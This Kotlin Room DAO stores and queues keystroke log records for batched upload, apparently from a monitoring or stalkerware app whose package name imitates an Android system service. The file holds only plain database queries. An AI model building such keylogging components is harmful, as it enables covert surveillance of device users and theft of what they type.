package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.KeyLog
import com.android.services.util.AppConstants

@Dao
interface KeyLogDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(keyLog: KeyLog)

    @Query("Update key_log set status = :updated_keyLogger where id BETWEEN :startId AND :endId")
    fun updateKeyLogger(updated_keyLogger: Int, startId: Int, endId: Int): Int

    @Query("Select * from key_log where status = :status order by id ASC limit ${AppConstants.otherLogsUploadLimit}")
    fun selectAllKeyLogger(status: Int): List<KeyLog>

}